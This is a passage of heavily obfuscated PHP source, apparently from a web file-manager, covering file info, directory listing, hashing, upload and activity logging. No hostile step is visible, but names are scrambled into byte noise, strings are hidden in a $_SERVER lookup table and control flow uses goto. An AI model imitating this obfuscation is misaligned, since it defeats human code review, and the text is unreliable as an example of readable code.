$this->getPathOuter($ŒŸÉáÌÊ), $Û©‚¸ùä[33] => $Û©‚¸ùä[230], $Û©‚¸ùä[79] => $this->size($ŒŸÉáÌÊ), $Û©‚¸ùä[169] => $this->ext($í§×¢Ú‡)); } $¡îÍ¹÷ª = array($Û©‚¸ùä[32] => $í§×¢Ú‡, $Û©‚¸ùä[87] => $this->getPathOuter($ŒŸÉáÌÊ), $Û©‚¸ùä[33] => $Û©‚¸ùä[230], $Û©‚¸ùä[231] => @filectime($ŒŸÉáÌÊ), $Û©‚¸ùä[88] => @filemtime($ŒŸÉáÌÊ), $Û©‚¸ùä[1431] => @fileatime($ŒŸÉáÌÊ), $Û©‚¸ùä[79] => $this->size($ŒŸÉáÌÊ), $Û©‚¸ùä[169] => $this->ext($í§×¢Ú‡), $Û©‚¸ùä[1432] => is_readable($ŒŸÉáÌÊ), $Û©‚¸ùä[1433] => is_writable($ŒŸÉáÌÊ), $Û©‚¸ùä[1434] => get_mode($ŒŸÉáÌÊ)); return $¡îÍ¹÷ª; } public function exist($¤ìª²’ä) { $¤ìª²’ä = $this->iconvSystem($¤ìª²’ä); return @file_exists($¤ìª²’ä); } public function isFile($é º®™ğ) { $é º®™ğ = $this->iconvSystem($é º®™ğ); return @is_file($é º®™ğ); } public function isFolder($ïšÏÀÕ) { $ïšÏÀÕ = $this->iconvSystem($ïšÏÀÕ); return @is_dir($ïšÏÀÕ); } public function listPath($ ç½ï¬, $ºÆ¡É  = false) { $°ª¶Ò‡Ï =& $_SERVER[ìïæ“œî]; $ ç½ï¬ = $this->iconvSystem($ ç½ï¬); $ ç½ï¬ = rtrim($ ç½ï¬, $°ª¶Ò‡Ï[8]) . $°ª¶Ò‡Ï[8]; $˜ÂÒâ’‹ = array($°ª¶Ò‡Ï[85] => array(), $°ª¶Ò‡Ï[86] => array()); if (!($Ö›€‘²Á = @opendir($ ç½ï¬))) { return $˜ÂÒâ’‹; } while (($°‹™¨•ö = readdir($Ö›€‘²Á)) !== !1) { if ($°‹™¨•ö == $°ª¶Ò‡Ï[10] || $°‹™¨•ö == $°ª¶Ò‡Ï[1340]) { continue; } $ã—Š®ğ = $ ç½ï¬ . $°‹™¨•ö; if (is_file($ã—Š®ğ)) { $˜ÂÒâ’‹[$°ª¶Ò‡Ï[86]][] = $this->fileInfo($ã—Š®ğ, $ºÆ¡É ); } else { $˜ÂÒâ’‹[$°ª¶Ò‡Ï[85]][] = $this->folderInfo($ã—Š®ğ, $ºÆ¡É ); } } closedir($Ö›€‘²Á); return $˜ÂÒâ’‹; } public function listAll($¯™“Öç», &$î¯ÇÌƒ = array()) { $àÂƒ‘Ï‰ =& $_SERVER[ìïæ“œî]; $¯™“Öç» = $this->iconvSystem($¯™“Öç»); $¯™“Öç» = rtrim($¯™“Öç», $àÂƒ‘Ï‰[8]) . $àÂƒ‘Ï‰[8]; if (!($¡¶ı“· = @opendir($¯™“Öç»))) { return $î¯ÇÌƒ; } while (($ØÀ£ôŒ› = readdir($¡¶ı“·)) !== !1) { if ($ØÀ£ôŒ› == $àÂƒ‘Ï‰[10] || $ØÀ£ôŒ› == $àÂƒ‘Ï‰[1340]) { continue; } $¯ƒôñÒ½ = $¯™“Öç» . $ØÀ£ôŒ›; $÷Üğ·øŸ = is_dir($¯ƒôñÒ½) && !is_link($¯ƒôñÒ½) ? 1 : 0; $¯ƒôñÒ½ = $÷Üğ·øŸ ? $¯ƒôñÒ½ . $àÂƒ‘Ï‰[8] : $¯ƒôñÒ½; $î¯ÇÌƒ[] = array($àÂƒ‘Ï‰[87] => $¯ƒôñÒ½, $àÂƒ‘Ï‰[78] => $÷Üğ·øŸ, $àÂƒ‘Ï‰[88] => intval(@filemtime($¯ƒôñÒ½)), $àÂƒ‘Ï‰[79] => $÷Üğ·øŸ ? 0 : intval($this->size($¯ƒôñÒ½))); if ($÷Üğ·øŸ) { $this->listAll($¯ƒôñÒ½, $î¯ÇÌƒ); } } closedir($¡¶ı“·); return $î¯ÇÌƒ; } public function has($æÓË³ûœ, $ÅÔáÔ‹– = false, $¸†ÛÈ­– = true) { $ºÙÜâÙ =& $_SERVER[ìïæ“œî]; $æÓË³ûœ = $this->iconvSystem($æÓË³ûœ); $æÓË³ûœ = rtrim($æÓË³ûœ, $ºÙÜâÙ[8]) . $ºÙÜâÙ[8]; if (!($ğ¾ŒÙ¸Š = @opendir($æÓË³ûœ))) { return !1; } $²ØÆÜÁ = 0; $ğĞò¦ë¥ = 0; $×úáô… = 0; while (($ê†È µ = readdir($ğ¾ŒÙ¸Š)) !== !1) { if ($ê†È µ == $ºÙÜâÙ[10] || $ê†È µ == $ºÙÜâÙ[1340]) { continue; } $ÑËÇ¿±¾ = $æÓË³ûœ . $ê†È µ; if ($ÅÔáÔ‹–) { $×úáô…++; if (@is_file($ÑËÇ¿±¾)) { $²ØÆÜÁ++; } else { $ğĞò¦ë¥++; } if ($×úáô… > 10000) { break; } continue; } if ($¸†ÛÈ­–) { if (@is_file($ÑËÇ¿±¾)) { return !0; } } else { if (@is_dir($ÑËÇ¿±¾ . $ºÙÜâÙ[8])) { return !0; } } } closedir($ğ¾ŒÙ¸Š); if ($ÅÔáÔ‹–) { return array($ºÙÜâÙ[239] => $²ØÆÜÁ, $ºÙÜâÙ[240] => $ğĞò¦ë¥); } return !1; } public function hashSimple($Çí·Š¼÷) { $Ã¬üëñ =& $_SERVER[ìïæ“œî]; if (!$Çí·Š¼÷) { return md5($Ã¬üëñ[12]); } $Çí·Š¼÷ = $this->iconvSystem($Çí·Š¼÷); $ƒ¥‹ô¿‡ = $this->size($Çí·Š¼÷); $ı¾“•ñ = 200; $Ÿ©Ò–•ø = 50; if ($ƒ¥‹ô¿‡ <= $ı¾“•ñ * $Ÿ©Ò–•ø) { return $this->hashMd5($Çí·Š¼÷) . $ƒ¥‹ô¿‡; } $øÑ¼ıº = $Ã¬üëñ[12]; $–äŞŒ» = intval($ƒ¥‹ô¿‡ / $Ÿ©Ò–•ø); $’Íí‡“ú = fopen($Çí·Š¼÷, $Ã¬üëñ[1435]); if (!$’Íí‡“ú) { return $øÑ¼ıº; } for ($óàÔİ‡Ó = 0; $óàÔİ‡Ó < $Ÿ©Ò–•ø; $óàÔİ‡Ó++) { fseek_64($’Íí‡“ú, $–äŞŒ» * $óàÔİ‡Ó); $øÑ¼ıº .= fread($’Íí‡“ú, $ı¾“•ñ); } fseek_64($’Íí‡“ú, $ƒ¥‹ô¿‡ - $ı¾“•ñ); $øÑ¼ıº .= fread($’Íí‡“ú, $ı¾“•ñ); fclose($’Íí‡“ú); return md5($øÑ¼ıº) . $ƒ¥‹ô¿‡; } public function getContent($•ê¹æµÃ) { $•ê¹æµÃ = $this->iconvSystem($•ê¹æµÃ); return file_get_contents($•ê¹æµÃ); } public function setContent($µíÓ»¬µ, $¸ªÓ¶»õ = '') { $µíÓ»¬µ = $this->iconvSystem($µíÓ»¬µ); $ØùÌÓÀ = @file_put_contents($µíÓ»¬µ, $¸ªÓ¶»õ, LOCK_EX); if (!$ØùÌÓÀ) { $this->writeLog(__FUNCTION__ . $_SERVER[ìïæ“œî][1425], !0); } clearstatcache(); @chmod($µíÓ»¬µ, $this->pathAuth); return $ØùÌÓÀ === !1 ? !1 : !0; } public function fileSubstr($†Éèƒå¢, $¾Éˆãš = 0, $÷ßÂŞ÷Û = false) { $ùôşÅŞ² =& $_SERVER[ìïæ“œî]; $†Éèƒå¢ = $this->iconvSystem($†Éèƒå¢); if ($÷ßÂŞ÷Û === !1) { $÷ßÂŞ÷Û = $this->size($†Éèƒå¢); } if ($÷ßÂŞ÷Û <= 0) { return $ùôşÅŞ²[12]; } $ âÑ·±Ï = fopen($†Éèƒå¢, $ùôşÅŞ²[1435]); if (!$ âÑ·±Ï) { return !1; } fseek_64($ âÑ·±Ï, $¾Éˆãš); $ÄëüÆ†¸ = fread($ âÑ·±Ï, $÷ßÂŞ÷Û); fclose($ âÑ·±Ï); if (!$ÄëüÆ†¸) { $this->writeLog(__FUNCTION__ . $ùôşÅŞ²[1425], !0); } return $ÄëüÆ†¸; } public function upload($•™²Åº³, $“³Ğº™ß, $ûØ¤îğ˜ = false, $šÚØÏ± = REPEAT_REPLACE) { if ($ûØ¤îğ˜) { return $this->moveFile($“³Ğº™ß, $•™²Åº³); } return $this->copyFile($“³Ğº™ß, $•™²Åº³); } public function setModifyTime($âÕû¦³‘, $¶èŒÙş = '') { @touch($âÕû¦³‘, intval($¶èŒÙş)); } public function download($¶ÂÕåëÉ, $õÑãÚØİ) { return $this->iconvSystem($¶ÂÕåëÉ); } } goto d³ƒÖ³åÚº; DïÑ‡çÊÇ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\x4c\x69\x67\150\164\x41\x70\x70"; public $modelType = "\123\x79\163\164\145\155\117\160\164\x69\157\x6e"; public $field = array("\x6e\141\155\145", "\x67\162\x6f\x75\160", "\144\145\163\143", "\x63\157\156\x74\x65\156\x74"); public function listData($ËÔ±¢–Ş = false, $±‘•¹ÏŠ = "\155\157\144\x69\x66\x79\124\151\x6d\145", $ß¡şŒ· = true) { return parent::listData($ËÔ±¢–Ş, $±‘•¹ÏŠ, $ß¡şŒ·); } public function remove($Â‚ÔÂº÷) { $Ò†¼üû” = $this->findByName($Â‚ÔÂº÷); if (!$Ò†¼üû”) { return !1; } return parent::remove($Ò†¼üû”[$_SERVER[ìïæ“œî][475]]); } public function add($ˆ´—‚ğğ) { if ($this->findByName($ˆ´—‚ğğ[$_SERVER[ìïæ“œî][32]])) { return !1; } return parent::insert($ˆ´—‚ğğ); } public function update($Ã¯«Ç²µ, $ßë—¦…µ) { $½•ï—§İ =& $_SERVER[ìïæ“œî]; $Ê•ª¥ó´ = $this->findByName($Ã¯«Ç²µ); $ĞİÑçîŸ = $this->findByName($ßë—¦…µ[$½•ï—§İ[32]]); if (!$Ê•ª¥ó´ || $ĞİÑçîŸ && $ĞİÑçîŸ[$½•ï—§İ[475]] != $Ê•ª¥ó´[$½•ï—§İ[475]]) { return !1; } return parent::update($Ê•ª¥ó´[$½•ï—§İ[475]], $ßë—¦…µ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\124\151\155\145", "\x74\151\x6d\145", "\x69\156\x73\x65\x72\164", "\x66\x75\156\x63\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $èÑÕ›Ä¤ =& $_SERVER[ìïæ“œî]; return array($èÑÕ›Ä¤[2307] => LNG($èÑÕ›Ä¤[2308]), $èÑÕ›Ä¤[2309] => LNG($èÑÕ›Ä¤[2310]), $èÑÕ›Ä¤[1888] => LNG($èÑÕ›Ä¤[2311]), $èÑÕ›Ä¤[2312] => LNG($èÑÕ›Ä¤[2313]), $èÑÕ›Ä¤[2314] => LNG($èÑÕ›Ä¤[2315]), $èÑÕ›Ä¤[2316] => LNG($èÑÕ›Ä¤[2317]), $èÑÕ›Ä¤[2318] => LNG($èÑÕ›Ä¤[2319]), $èÑÕ›Ä¤[1918] => LNG($èÑÕ›Ä¤[2319]), $èÑÕ›Ä¤[1919] => LNG($èÑÕ›Ä¤[2320]), $èÑÕ›Ä¤[2321] => LNG($èÑÕ›Ä¤[2322]), $èÑÕ›Ä¤[2323] => LNG($èÑÕ›Ä¤[2324]), $èÑÕ›Ä¤[2325] => LNG($èÑÕ›Ä¤[2326]), $èÑÕ›Ä¤[2327] => LNG($èÑÕ›Ä¤[2328]), $èÑÕ›Ä¤[1916] => LNG($èÑÕ›Ä¤[2329]), $èÑÕ›Ä¤[2330] => LNG($èÑÕ›Ä¤[2331]), $èÑÕ›Ä¤[1923] => LNG($èÑÕ›Ä¤[2332]), $èÑÕ›Ä¤[2333] => LNG($èÑÕ›Ä¤[2334]), $èÑÕ›Ä¤[2335] => LNG($èÑÕ›Ä¤[2336]), $èÑÕ›Ä¤[2337] => LNG($èÑÕ›Ä¤[2338]), $èÑÕ›Ä¤[2339] => LNG($èÑÕ›Ä¤[2340]), $èÑÕ›Ä¤[1926] => LNG($èÑÕ›Ä¤[2341]), $èÑÕ›Ä¤[1927] => LNG($èÑÕ›Ä¤[2342]), $èÑÕ›Ä¤[2343] => LNG($èÑÕ›Ä¤[2344]), $èÑÕ›Ä¤[2345] => LNG($èÑÕ›Ä¤[2346]), $èÑÕ›Ä¤[2347] => LNG($èÑÕ›Ä¤[2348]), $èÑÕ›Ä¤[1921] => LNG($èÑÕ›Ä¤[2349]), $èÑÕ›Ä¤[2350] => LNG($èÑÕ›Ä¤[2351]), $èÑÕ›Ä¤[1920] => LNG($èÑÕ›Ä¤[2352]), $èÑÕ›Ä¤[2353] => LNG($èÑÕ›Ä¤[2354]), $èÑÕ›Ä¤[2355] => LNG($èÑÕ›Ä¤[2356]), $èÑÕ›Ä¤[2357] => LNG($èÑÕ›Ä¤[2356]), $èÑÕ›Ä¤[2358] => LNG($èÑÕ›Ä¤[2359]), $èÑÕ›Ä¤[2360] => LNG($èÑÕ›Ä¤[2360]), $èÑÕ›Ä¤[2361] => LNG($èÑÕ›Ä¤[1892]), $èÑÕ›Ä¤[2362] => LNG($èÑÕ›Ä¤[2363]), $èÑÕ›Ä¤[2364] => LNG($èÑÕ›Ä¤[2365]), $èÑÕ›Ä¤[2366] => LNG($èÑÕ›Ä¤[2367]), $èÑÕ›Ä¤[2368] => LNG($èÑÕ›Ä¤[2369]), $èÑÕ›Ä¤[2370] => LNG($èÑÕ›Ä¤[2371]), $èÑÕ›Ä¤[2372] => LNG($èÑÕ›Ä¤[2372]), $èÑÕ›Ä¤[2373] => LNG($èÑÕ›Ä¤[2374]), $èÑÕ›Ä¤[2375] => LNG($èÑÕ›Ä¤[2376]), $èÑÕ›Ä¤[2377] => LNG($èÑÕ›Ä¤[2378]), $èÑÕ›Ä¤[2379] => LNG($èÑÕ›Ä¤[2380]), $èÑÕ›Ä¤[2381] => LNG($èÑÕ›Ä¤[2382]), $èÑÕ›Ä¤[2383] => LNG($èÑÕ›Ä¤[2384]), $èÑÕ›Ä¤[212] => LNG($èÑÕ›Ä¤[212]), $èÑÕ›Ä¤[213] => LNG($èÑÕ›Ä¤[2385]), $èÑÕ›Ä¤[2386] => LNG($èÑÕ›Ä¤[2386])); } private function typeFile() { $Áòßçœ³ =& $_SERVER[ìïæ“œî]; $ıœÅ»¶ = array($Áòßçœ³[1923] => array($Áòßçœ³[1924]), $Áòßçœ³[2325] => array($Áòßçœ³[2387]), $Áòßçœ³[2327] => array($Áòßçœ³[2388]), $Áòßçœ³[1916] => array($Áòßçœ³[1917], $Áòßçœ³[2389]), $Áòßçœ³[2335] => array(), $Áòßçœ³[2337] => array(), $Áòßçœ³[2339] => array(), $Áòßçœ³[1926] => array($Áòßçœ³[1928]), $Áòßçœ³[1927] => array($Áòßçœ³[1928]), $Áòßçœ³[2343] => array($Áòßçœ³[2390]), $Áòßçœ³[2345] => array($Áòßçœ³[2390]), $Áòßçœ³[2347] => array($Áòßçœ³[2391]), $Áòßçœ³[2333] => array($Áòßçœ³[2392]), $Áòßçœ³[1921] => array($Áòßçœ³[2393]), $Áòßçœ³[2350] => array($Áòßçœ³[2394]), $Áòßçœ³[1920] => array($Áòßçœ³[1922])); return $ıœÅ»¶; } private function typeAll() { $şÚ€ÚˆÇ =& $_SERVER[ìïæ“œî]; $Ïêé˜ô˜ = $this->typeList; $şÇÔ‚ˆ = array_filter($this->typeFile()); foreach ($şÇÔ‚ˆ as $‹Í…‘µ† => $íù§³µÇ) { $Ïêé˜ô˜[$íù§³µÇ[0]] = $Ïêé˜ô˜[$‹Í…‘µ†]; } $Ïêé˜ô˜[$şÚ€ÚˆÇ[1928]] = LNG($şÚ€ÚˆÇ[2395]); $Ïêé˜ô˜[$şÚ€ÚˆÇ[2390]] = LNG($şÚ€ÚˆÇ[2396]); return $Ïêé˜ô˜; } public function addLog($á“ÀâŸî, $ñ‹ˆÙßŠ = array()) { $¡³„¶ƒÌ =& $_SERVER[ìïæ“œî]; if (!isset($this->typeList[$á“ÀâŸî])) { return; } $óâÛÉ£Â = Session::get($¡³„¶ƒÌ[2087]); if (!$óâÛÉ£Â) { $óâÛÉ£Â = _get($ñ‹ˆÙßŠ, $¡³„¶ƒÌ[1747], 0); } if ($á“ÀâŸî == $¡³„¶ƒÌ[2362] && is_array($ñ‹ˆÙßŠ[$¡³„¶ƒÌ[2397]]) && !$ñ‹ˆÙßŠ[$¡³„¶ƒÌ[2397]]) { return; } $™¯ÉÖ„© = get_client_ip(); if (!$ñ‹ˆÙßŠ || strlen(json_encode($ñ‹ˆÙßŠ)) >= 1024 * 64) { if ($ñ‹ˆÙßŠ && is_array($ñ‹ˆÙßŠ)) { $ñ‹ˆÙßŠ = array_intersect_key($ñ‹ˆÙßŠ, array_flip($¡³„¶ƒÌ[475], $¡³„¶ƒÌ[32])); $ñ‹ˆÙßŠ[$¡³„¶ƒÌ[2398]] = $™¯ÉÖ„©; } else { $ñ‹ˆÙßŠ = array($¡³„¶ƒÌ[2398] => $™¯ÉÖ„©); } } else { if (is_array($ñ‹ˆÙßŠ)) { $ñ‹ˆÙßŠ[$¡³„¶ƒÌ[2398]] = $™¯ÉÖ„©; } else { $ñ‹ˆÙßŠ = array($¡³„¶ƒÌ[1264] => $ñ‹ˆÙßŠ, $¡³„¶ƒÌ[2398] => $™¯ÉÖ„©); } } $ñ‹ˆÙßŠ = array($¡³„¶ƒÌ[1737] => Session::sign(), $¡³„¶ƒÌ[1738] => intval($óâÛÉ£Â), $¡³„¶ƒÌ[33] => $á“ÀâŸî, $¡³„¶ƒÌ[1740] => json_encode($ñ‹ˆÙßŠ)); parent::add($ñ‹ˆÙßŠ); } public function remove($É»ùÔüø) { $this->where(array($_SERVER[ìïæ“œî][493] => $É»ùÔüø))->delete(); } private function _makeOrder($ß¯‘­ë± = '') { $óÂ–ì¿¤ =& $_SERVER[ìïæ“œî]; $¨–ÆÌ˜è = $óÂ–ì¿¤[231]; $‰“’á“¯ = array($óÂ–ì¿¤[523] => $óÂ–ì¿¤[524], $óÂ–ì¿¤[525] => $óÂ–ì¿¤[526]); $Ã¨º†Õ = Input::get($óÂ–ì¿¤[531], $óÂ–ì¿¤[7], $óÂ–ì¿¤[2123], array($óÂ–ì¿¤[2041], $óÂ–ì¿¤[525])); $Ã¨º†Õ = $‰“’á“¯[$Ã¨º†Õ]; $ß¯‘­ë± = $ß¯‘­ë± . "{$¨–ÆÌ˜è}\40{$Ã¨º†Õ}"; return $this->order($ß¯‘­ë±); } public function get($ğÔúä€± = '') { $«³è«ºƒ =& $_SERVER[ìïæ“œî]; if (!$ğÔúä€±) { show_json(array()); } $¹ÈíÜè‚ = array(); if ($ğÔúä€±[$«³è«ºƒ[1747]]) { $¹ÈíÜè‚[$«³è«ºƒ[1747]] = $ğÔúä€±[$«³è«ºƒ[1747]]; } if (isset($ğÔúä€±[$«³è«ºƒ[809]])) { $Åêˆş = $ğÔúä€±[$«³è«ºƒ[809]]; $“ŞğñØ· = isset($ğÔúä€±[$«³è«ºƒ[810]]) ? $ğÔúä€±[$«³è«ºƒ[810]] : time(); $¹ÈíÜè‚[$«³è«ºƒ[231]] = array($«³è«ºƒ[409], array($Åêˆş, $“ŞğñØ·)); } if ($ğÔúä€±[$«³è«ºƒ[33]]) { $„¤­£Ïä = explode($«³è«ºƒ[50], $ğÔúä€±[$«³è«ºƒ[33]]); $ôĞéÖî = $this->typeFile(); $³¨ıĞ¹¡ = array(); foreach ($„¤­£Ïä as $Á‚ƒ§¯‰) { $³¨ıĞ¹¡[] = $Á‚ƒ§¯‰; if (isset($ôĞéÖî[$Á‚ƒ§¯‰])) { $³¨ıĞ¹¡ = array_merge($³¨ıĞ¹¡, $ôĞéÖî[$Á‚ƒ§¯‰]); } } $³¨ıĞ¹¡ = array_unique($³¨ıĞ¹¡); if ($³¨ıĞ¹¡) { $¹ÈíÜè‚[$«³è«ºƒ[33]] = array($«³è«ºƒ[7], $³¨ıĞ¹¡); } } else { $¹ÈíÜè‚[$«³è«ºƒ[33]] = array($«³è«ºƒ[2399], $«³è«ºƒ[2400]); } if (!empty($ğÔúä€±[$«³è«ºƒ[2398]])) { $¹ÈíÜè‚[$«³è«ºƒ[526]] = array($«³è«ºƒ[459], "\x25{$ğÔúä€±[$«³è«ºƒ[2398]]}\x25"); } $­ú©©Üƒ = $this->_makeOrder()->where($¹ÈíÜè‚)->selectPage(); if (empty($­ú©©Üƒ[$«³è«ºƒ[445]])) { show_json(array(), !0, $­ú©©Üƒ[$«³è«ºƒ[442]]); } $­ú©©Üƒ[$«³è«ºƒ[445]] = $this->logList($­ú©©Üƒ[$«³è«ºƒ[445]]); return $­ú©©Üƒ; } private function ipAddress(&$ĞÈØó¹£) { $Åğ™¹¼É =& $_SERVER[ìïæ“œî]; if (!empty($ĞÈØó¹£[$Åğ™¹¼É[2398]])) { $ú“÷‚ŒÕ = IpLocation::get($ĞÈØó¹£[$Åğ™¹¼É[2398]]); } else { $ú“÷‚ŒÕ = LNG($Åğ™¹¼É[2401]); } $ĞÈØó¹£[$Åğ™¹¼É[2402]] = $ú“÷‚ŒÕ; } private function descZipDownload($ş² Íø , &$–¥¿“­) { $ìñ¿èåÂ =& $_SERVER[ìïæ“œî]; if (!isset($ş² Íø [$ìñ¿èåÂ[2403]])) { return; } $Šû¡åÃù = json_decode($ş² Íø [$ìñ¿èåÂ[2403]], !0); foreach ($Šû¡åÃù as $¹ÎË‹¿ò) { try { $„¨Ñ›ç = IO::infoFullSimple($¹ÎË‹¿ò[$ìñ¿èåÂ[87]]); } catch (Exception $ä•šµà¨) { continue; } $ş² Íø [$ìñ¿èåÂ[87]] = $¹ÎË‹¿ò[$ìñ¿èåÂ[87]]; $–¥¿“­[] = $ş² Íø [$ìñ¿èåÂ[193]] = $„¨Ñ›ç[$ìñ¿èåÂ[193]]; $–¥¿“­[] = $ş² Íø [$ìñ¿èåÂ[2179]] = $„¨Ñ›ç[$ìñ¿èåÂ[192]]; break; } return $ş² Íø ; } private function getSourceList(&$¶ëïë³ş) { $«ºŞØÎÍ =& $_SERVER[ìïæ“œî]; $¶‚¾¶Ñ¶ = array(); foreach ($¶ëïë³ş as $øË÷§·à => $ÍÌ…ÍÈì) { $»—˜±øÜ = json_decode($ÍÌ…ÍÈì[$«ºŞØÎÍ[526]], !0); if ($ÍÌ…ÍÈì[$«ºŞØÎÍ[33]] == $«ºŞØÎÍ[1919]) { $»—˜±øÜ = $this->descZipDownload($»—˜±øÜ, $¶‚¾¶Ñ¶); $¶ëïë³ş[$øË÷§·à][$«ºŞØÎÍ[526]] = json_encode($»—˜±øÜ); continue; } if (strpos($ÍÌ…ÍÈì[$«ºŞØÎÍ[33]], $«ºŞØÎÍ[2181]) !== 0) { if (!isset($»—˜±øÜ[$«ºŞØÎÍ[87]]) || strpos($ÍÌ…ÍÈì[$«ºŞØÎÍ[33]], $«ºŞØÎÍ[2404]) !== 0) { continue; } try { $”÷„Ù„ª = IO::infoFullSimple($»—˜±øÜ[$«ºŞØÎÍ[87]]); } catch (Exception $‰é§êË) { continue; } $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[193]] = $”÷„Ù„ª[$«ºŞØÎÍ[193]]; $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[2179]] = $”÷„Ù„ª[$«ºŞØÎÍ[192]]; $¶ëïë³ş[$øË÷§·à][$«ºŞØÎÍ[526]] = json_encode($»—˜±øÜ); continue; } $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[193]]; $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[2179]]; if ($»—˜±øÜ[$«ºŞØÎÍ[33]] == $«ºŞØÎÍ[620]) { $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[526]][$«ºŞØÎÍ[1218]]; $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[526]][$«ºŞØÎÍ[1219]]; } if ($»—˜±øÜ[$«ºŞØÎÍ[33]] == $«ºŞØÎÍ[2190]) { $¶‚¾¶Ñ¶[] = $»—˜±øÜ[$«ºŞØÎÍ[526]][$«ºŞØÎÍ[193]]; } } if (!$¶‚¾¶Ñ¶) { return array(); } return Model($«ºŞØÎÍ[873])->sourceListInfo($¶‚¾¶Ñ¶, !0); } private function logList($úÕÜµ†) { $¸¼êø™¶ =& $_SERVER[ìïæ“œî]; $â·Äå‚Ä = array_to_keyvalue($úÕÜµ†, $¸¼êø™¶[12], $¸¼êø™¶[1747]); $ù¥õ²¤ã = Model($¸¼êø™¶[598])->userListInfo(array_unique($â·Äå‚Ä)); $©¹”ª£§ = $this->getSourceList($úÕÜµ†); $œ«ãá£² = $this->typeAll(); $°º ìè¡ = array(); $¹÷§µÌ€ = array(); foreach ($úÕÜµ† as $…ªÓ ±Ü => $’ª½Ôï) { $Êô‰Ã‚ù = $’ª½Ôï[$¸¼êø™¶[33]]; $õ’í„öå = isset($ù¥õ²¤ã[$’ª½Ôï[$¸¼êø™¶[1747]]]) ? $ù¥õ²¤ã[$’ª½Ôï[$¸¼êø™¶[1747]]] : !1; $å‰µ´¹š = strpos($Êô‰Ã‚ù, $¸¼êø™¶[2405]) === 0 ? LNG($¸¼êø™¶[2406]) : LNG($¸¼êø™¶[2401]); $’ª½Ôï[$¸¼êø™¶[32]] = isset($õ’í„öå[$¸¼êø™¶[32]]) ? $õ’í„öå[$¸¼êø™¶[32]] : LNG($¸¼êø™¶[2401]); $’ª½Ôï[$¸¼êø™¶[2234]] = isset($õ’í„öå[$¸¼êø™¶[2234]]) ? $õ’í„öå[$¸¼êø™¶[2234]] : $¸¼êø™¶[12]; $’ª½Ôï[$¸¼êø™¶[1636]] = isset($œ«ãá£²[$Êô‰Ã‚ù]) ? $œ«ãá£²[$Êô‰Ã‚ù] : $å‰µ´¹š; $’ª½Ôï[$¸¼êø™¶[2122]] = $õ’í„öå; $ÀË’ã‰ = json_decode($’ª½Ôï[$¸¼êø™¶[526]], !0); $’ª½Ôï[$¸¼êø™¶[2398]] = isset($ÀË’ã‰[$¸¼êø™¶[2398]]) ? $ÀË’ã‰[$¸¼êø™¶[2398]] : $¸¼êø™¶[12]; $’ª½Ôï[$¸¼êø™¶[2402]] = IpLocation::get($’ª½Ôï[$¸¼êø™¶[2398]]); if (strpos($Êô‰Ã‚ù, $¸¼êø™¶[2181]) === 0 || isset($ÀË’ã‰[$¸¼êø™¶[2179]])) { $ÀË’ã‰[$¸¼êø™¶[90]] = $©¹”ª£§[$ÀË’ã‰[$¸¼êø™¶[193]]]; $ÀË’ã‰[$¸¼êø™¶[2195]] = $©¹”ª£§[$ÀË’ã‰[$¸¼êø™¶[2179]]]; if ($ÀË’ã‰[$¸¼êø™¶[33]] == $¸¼êø™¶[620]) { $ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[1218]] = $©¹”ª£§[$ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[1218]]]; $ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[1219]] = $©¹”ª£§[$ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[1219]]]; } if ($ÀË’ã‰[$¸¼êø™¶[33]] == $¸¼êø™¶[2190]) { $ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[193]] = $©¹”ª£§[$ÀË’ã‰[$¸¼êø™¶[526]][$¸¼êø™¶[193]]]; } if ($ÀË’ã‰[$¸¼êø™¶[33]] == $¸¼êø™¶[1914]) { $ÀË’ã‰[$¸¼êø™¶[2195]] = $ÀË’ã‰[$¸¼êø™¶[90]]; $ÀË’ã‰[$¸¼êø™¶[2179]] = $ÀË’ã‰[$¸¼êø™¶[2195]][$¸¼êø™¶[193]]; $ÀË’ã‰[$¸¼êø™¶[90]] = !1; $ÀË’ã‰[$¸¼êø™¶[193]] = $¸¼êø™¶[12]; } $Ÿ®‰²© = array($¸¼êø™¶[1914], $¸¼êø™¶[2177]); if (!in_array($ÀË’ã‰[$¸¼êø™¶[33]], $Ÿ®‰²©)) { if ($ÀË’ã‰[$¸¼êø™¶[90]] && $ÀË’ã‰[$¸¼êø™¶[90]][$¸¼êø™¶[190]] == $¸¼êø™¶[191]) { $¹÷§µÌ€[] = $’ª½Ôï[$¸¼êø™¶[475]]; unset($úÕÜµ†[$…ªÓ ±Ü]); continue; } if ($ÀË’ã‰[$¸¼êø™¶[2195]] && $ÀË’ã‰[$¸¼êø™¶[2195]][$¸¼êø™¶[190]] == $¸¼êø™¶[191]) { $¹÷§µÌ€[] = $’ª½Ôï[$¸¼êø™¶[475]]; unset($úÕÜµ†[$…ªÓ ±Ü]); continue; } } } $’ª½Ôï[$¸¼êø™¶[526]] = $ÀË’ã‰; unset($’ª½Ôï[$¸¼êø™¶[2407]]); $°º ìè¡[] = $’ª½Ôï; } $this->clearSystemPathLog($¹÷§µÌ€); return $°º ìè¡; } private function clearSystemPathLog($ÔˆÑ§É) { $’ô¾å¼ =& $_SERVER[ìïæ“œî]; if (count($ÔˆÑ§É) == 0) { return; } $¼İë¢ÖÎ = array($’ô¾å¼[475] => array($’ô¾å¼[7], array_unique($ÔˆÑ§É))); $this->where($¼İë¢ÖÎ)->delete(); } public function deviceList($’ÛÖ‘¥Õ, $ÙÌÌù˜Ñ = 0) { $Î›š˜ìí =& $_SERVER[ìïæ“œî]; $‘ªÏÉõ“ = array($Î›š˜ìí[1747] => $’ÛÖ‘¥Õ, $Î›š˜ìí[231] => array($Î›š˜ìí[1069], 